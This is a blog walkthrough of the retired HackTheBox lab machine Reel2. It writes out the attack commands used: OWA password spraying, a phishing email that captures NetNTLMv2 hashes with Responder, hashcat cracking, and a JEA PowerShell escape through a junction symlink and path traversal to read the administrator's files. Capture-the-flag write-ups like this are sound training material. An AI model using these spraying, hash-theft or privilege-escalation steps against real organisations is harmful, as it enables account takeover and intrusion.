@@ -1,0 +1,395 @@
+---
+layout: walkthrough
+title: HackTheBox - Reel2
+date: 2021-03-14 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/reel2.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Reel2 --`10.10.10.210`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/Overview.png"  style="width: 65%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+nmap -sC -sV 10.10.10.210
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-02 13:13 EST
+Nmap scan report for 10.10.10.210
+Host is up (0.18s latency).
+Not shown: 991 filtered ports
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 8.5
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: 403 - Forbidden: Access is denied.
+443/tcp  open  ssl/https?
+|_ssl-date: 2021-02-02T16:24:52+00:00; -1h50m42s from scanner time.
+6001/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6002/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6004/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+6005/tcp open  msrpc      Microsoft Windows RPC
+6006/tcp open  msrpc      Microsoft Windows RPC
+6007/tcp open  msrpc      Microsoft Windows RPC
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
+|_http-title: Welcome | Wallstant
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1h50m42s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 207.87 seconds
+
+```
+
+</details>
+
+
+From the output shown above, we can see that the machine is a Linux machine and I added `reel2.htb` to the `/etc/hosts` file. As this is a Windows machine and it only has 3 interactive open ports, I started by doing some web enumeration. 
+
+### Basic Web Enumeration
+While browsing the web application, I ran the following wfuzz and Gobuster scans:
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Reel2$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.210/FUZZ.txt" -t 100
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.210/FUZZ.txt
+Total requests: 4658
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                          
+===================================================================
+
+Total time: 15.24054
+Processed Requests: 4658
+Filtered Requests: 4658
+Requests/sec.: 305.6321
+
+```
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Reel2$ sudo gobuster dir -u http://10.10.10.210 -w /usr/share/seclists/Discovery/Web-Content/common.txt -b 404,403
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:                     http://10.10.10.210
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.0.1
+[+] Timeout:                 10s
+===============================================================
+2021/02/02 13:34:55 Starting gobuster
+===============================================================
+[ERROR] 2021/02/02 13:35:19 [!] Get http://10.10.10.210/autodiscover: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+/owa (Status: 301)
+===============================================================
+2021/02/02 13:36:24 Finished
+===============================================================
+```
+
+</details>
+
+As shown above, an `owa` directory exists on reel2. Navigating to http://10.10.10.210/owa resulted in a server error as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img1.png"  style="width: 65%" />
+</p>
+
+However, changing to https redirected to the following URL: <https://10.10.10.210/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f10.10.10.210%2fowa%2f> which provided me with an OWA login form. Since I didn't have any potential usernames or passwords at this point, I noted it down and decided to look into port 8080. This port hosted another web application named `Wallstant`:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img2.png"  style="width: 80%" />
+</p>
+
+### Wallstant Enumeration
+
+After registering a new account, I was able to authenticate to the application. The home page is shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img3.png"  style="width: 80%" />
+</p>
+
+Going through the web application, I was able to build up a list of potential usernames and I could also see that there were two publicly available posts:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img4.png"  style="width: 40%" />
+</p>
+
+Some example usernames from the web application included:
+* cube0x0
+* cube
+* svensson
+* larsson
+* adams
+* trump
+
+The username list I created was made up of the following possibilities using username-anarchy: `first.last`, `f.last`, `first`, `flast`. From there, I decided to create a password list based on the posts within the web application. I created two lists based on the words `fika` and `summer`:
+
+```bat
+cat /usr/share/wordlists/rockyou.txt | grep Summer > pass.txt
+
+OR
+
+grep -R Summer /usr/share/Seclists | tee pass.txt
+cat pass.txt | cut -d ":" -f2 > summer.txt
+```
+
+A quick Google search for a OWA password spray tool provided me with a link to this Github project: <https://github.com/byt3bl33d3r/SprayingToolkit>.
+
+> A blazing fast password sprayer for Lync/Skype For Business and OWA, built on Asyncio and Python 3.7
+
+To ensure that the tool was working, I used the following command:
+
+```bat
+vagrant@ko:/opt/SprayingToolkit$ python3 atomizer.py owa 10.10.10.210 --recon
+[*] Trying to find autodiscover URL
+[+] Using OWA autodiscover URL: https://10.10.10.210/autodiscover/autodiscover.xml
+[+] OWA domain appears to be hosted internally
+[+] Got internal domain name using OWA: HTB
+```
+
+Success! Alright, now that I knew that it was working and that it detected the OWA page, I attempted to pass it the username and password lists that I previously created. The help menu for the atomizer tool seemed to have the usernames and passwords switched around so I needed to just change the order of the files as shown below:
+
+```bat
+vagrant@ko:/opt/SprayingToolkit$ python3 atomizer.py owa 10.10.10.210 /home/vagrant/Desktop/HackTheBox/Reel2/passwords.txt /home/vagrant/Desktop/HackTheBox/Reel2/usernames.txt -t 5 -i 0:0:5
+[*] Trying to find autodiscover URL
+[+] Using OWA autodiscover URL: https://10.10.10.210/autodiscover/autodiscover.xml
+[+] OWA domain appears to be hosted internally
+```
+
+Eventually, I found a valid set of credentials:
+
+```bat
+[+] Found credentials: s.svensson:Summer2020
+```
+
+### Phishing with s.svensson
+
+Since I knew that I had the credentials for a user, I logged into their OWA instance as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img5.png"  style="width: 80%" />
+</p>
+
+
+There were no items within the different boxes so I decided to follow: <https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook> which provided a method which would extract NTLMv2 hashes from a phishing link.
+
+> If a target system is not running the latest version of Windows/Outlook, it may be possible to craft such an email that allows an attacker to steal the victim's NetNTLMv2 hashes without requiring any interaction from the user - clicking the email to preview it is enough for the hashes to be stolen.
+
+Since I didn't know the user, I selected all users from the address book. I created a very simple example by adding my IP address in the subject and body of the email:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img6.png"  style="width: 80%" />
+</p>
+
+In order to retrieve any potential hashes, I needed to start responder on my Kali machine:
+
+```bat
+responder -I tun0 -v
+```
+
+After a few minutes, I successfully retrieved a NTLM hash for the `k.svensson` user:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img7.png"  style="width: 80%" />
+</p>
+
+From the above, we know that it is a NetNTLMv2 Hash -- this could also be confirmed by using hashid. In order to crack the hash, I made use of hashcat. In order to determine the mode to use when cracking, you can use `hashcat --example-hashes` and locate the type of hash you are cracking:
+
+```bat
+MODE: 5600                                                                                                        
+TYPE: NetNTLMv2                                                                                                   
+HASH: 0UL5G37JOI0SX::6VB1IS0KA74:ebe1afa18b7fbfa6:aab8bf8675658dd2a939458a1077ba08:010100000000000031c8aa092510945398b9f7b7dde1a9fb00000000f7876f2b04b700                          
+```
+
+Since I knew that I needed to use mode 5600, I could complete the command:
+
+```bat
+hashcat -m 5600 hashes.txt
+```
+
+If you wanted to specify a wordlist to use during this process, you could include it as a parameter:`/usr/share/wordlists/rockyou.txt --force`. Success! I finally cracked the password:
+
+* username = k.svensson
+* password = kittycat1 
+
+
+## Lateral Movement using k.svensson
+
+Now that I had additional credentials for the host, I attempted to log into the OWA instance again, but it didn't provide anything new. So I ran another nmap scan and found that WinRM -- port 5985 was open. I attempted to log into the remote server using `evil-winrm`, but it was not possible since `Invoke-Expression` cmdlet did not exist on the host:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img8.png"  style="width: 80%" />
+</p>
+
+### Fighting with PowerShell on Kali
+This is a small detour, but I had a ton of issues installing PowerShell on Kali -- for some reason my version couldn't find a certain library, but I eventually found a way around it, as shown below:
+
+Download the PowerShell '.tar.gz' archive:
+* `curl -L  https://github.com/PowerShell/PowerShell/releases/download/v7.1.0/powershell-7.1.0-linux-x64.tar.gz -o /tmp/powershell.tar.gz`
+
+Create the target folder where PowerShell will be placed:
+* `sudo mkdir -p /opt/microsoft/powershell/7`
+
+Expand PowerShell to the target folder:
+* `sudo tar zxf /tmp/powershell.tar.gz -C /opt/microsoft/powershell/7`
+
+Set execute permissions:
+* `sudo chmod +x /opt/microsoft/powershell/7/pwsh`
+
+Create the symbolic link that points to pwsh:
+* `sudo ln -s /opt/microsoft/powershell/7/pwsh /usr/bin/pwsh`
+
+From here, I had additional issues related to WSMan:
+> New-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.
+
+In order to fix this issue, I determined that `libmi.so` was installed by PowerShell which was requesting `libssl-1.0.0` and `libcrypto-1.0.0` specifically but only `1.0.2` was installed for each. In order to verify this, I ran the following command:
+
+```bat
+ldd /opt/microsoft/powershell/6/libmi.so
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img9.png"  style="width: 80%" />
+</p>
+
+In order to remediate this issue, I created a symlink to the files:
+
+```bat
+ln -s libssl.so.1.0.2 libssl.so.1.0.0
+ln -s libcrypto.so.1.0.2 libcrypto.so.1.0.0
+```
+
+### PowerShell Enumeration with k.svensson
+
+Now that I had PowerShell installed and I fixed the WSMan issue, I attempted to create a new session using the credentials that I previously obtained. In order to do this, I attempted to make use of PowerShell's `New-PSSession` which is described in their documentation: <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.1>. In order to do this, I followed Example 2 for creating a session on a remote computer. I had to ensure that it was using the correct user, so I included the `Credential` flag (otherwise it assumes the current user) and I also included the authentication type because the default type is default. The final connection string looked as follows:
+
+```powershell
+$reel_session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Credential k.svensson
+Enter-PSSession $reel_session
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img10.png"  style="width: 80%" />
+</p>
+
+Since the commands for `evil-winrm` failed, I started off by identifying which commands were available on the host:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img11.png"  style="width: 80%" />
+</p>
+
+As shown above, I had limited access and most commands would not work. However, I was able to execute PowerShell commands through the use of a script block. This is a less obscure alternative to overriding the `Out-Default` cmdlet for implicit `Out-File` calls as it wraps the commands of interest in a script block `({ ... })` and pipe its invocation (&) to a single Out-File call. Unless you need to control the output encoding, you can then even use `>`, Out-File's effective alias. In order to ensure that this worked, I used the following command which creates a function and runs it:
+
+```bat
+& {  ls } 
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img12.png"  style="width: 80%" />
+</p>
+
+Looking into `.psrc` file, the only code that was not commented out is provided below:
+
+```powershell
+# Functions to define when applied to a session
+FunctionDefinitions = @{
+    'Name' = 'Check-File'
+    'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like "D:\*" -or $Path -like 
+"C:\ProgramData\*" ; if($check) {get-content $Path}} }
+```
+
+While looking into the `.pssc` file, I found the following:
+
+```powershell
+# User roles (security groups), and the role capabilities that should be applied to them when applied to a session
+RoleDefinitions = @{
+    'htb\jea_test_account' = @{
+        'RoleCapabilities' = 'jea_test_account' } }
+
+# Language mode to apply when applied to a session. Can be 'NoLanguage' (recommended), 'RestrictedLanguage', 'ConstrainedLanguage', or 'FullLanguage'
+LanguageMode = 'NoLanguage'
+```
+
+As shown above, there was a `jea_test_account` on the server which was able to read files from the `C:\ProgramData\*` directory. I still didn't have any additional information, but it was worth noting down at this point.
+
+### Stick Notes Exploration
+
+While looking into the user's home directory, I noticed that there was a `Sticky Notes.lnk` file. Since it was a user created process, AppData contains the log information for a user's context. Going into `LevelDB`, there is a rather large log file: `000003.log`. I used the following command to perform a hexdump of the file, since using the generic `type` command just produced unreadable content:
+
+```powershell
+type *.log | format-hex
+```
+
+The hexdump showed us the password for the `jea_test_account` that we identified earlier:
+
+```json
+{"first":"<p>Credentials for JEA</p><p>jea_test_account:Ab!Q@vcg^%@#1</p>","back":"rgb(255, 242, 171)","title":"rgb(255, 235, 129)","wid":"350","hei":"375","deleted":"no","closed":"yes","locked":"no"}
+```
+
+Since I had access to the JEA account and I knew that the user was able to access the `ProgramData` directory. I tried to create a symlink to the `Administrator` directory.
+
+## Privilege Escalation with Symlink
+In order to create the symlink to the Administrator directory, I used the following command:
+
+```powershell
+New-Item -ItemType Junction -Path 'C:\ProgramData\JEA' -Target 'C:\Users\Administrator'
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img13.png"  style="width: 80%" />
+</p>
+
+Once that was created, I logged into the PowerShell session for the JEA user using the following commands:
+
+```powershell
+$username = "jea_test_account"
+$password = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList  ($username, $password)
+
+$jea_test_session = New-PSSession -ComputerName 10.10.10.210 -ConfigurationName jea_test_account  -Authentication Negotiate -Credential $cred
+Enter-PSSession $jea_test_session
+```
+Now that I had access to the host as the `jea_test_account`, there was another issue -- it seemed that the account made use of No Language Mode. No language means no script text of any form is permitted. This precludes the use of the `AddScript()` method which sends fragments of PowerShell script to be parsed and executed. You can only use `AddCommand()` and `AddParameter()` which don't go through the parser. Once again, I ran `Get-Command` to check which commands were available. In addition to the commands that I had access to previously, I now had access to the `Check-File` command:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Reel2/img14.png"  style="width: 80%" />
+</p>
+
+Since I had access to `Check-File`, I simply used that command on `root.txt` and read the file
+```bat
+[10.10.10.210]: PS> Check-File C:\ProgramData\JEA\Desktop\root.txt
+```
+
+An alternative method would have been to simply use the LFI vulnerability instead of creating a symlink, e.g.:
+
+```bat
+[10.10.10.210]: PS> Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
+```
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
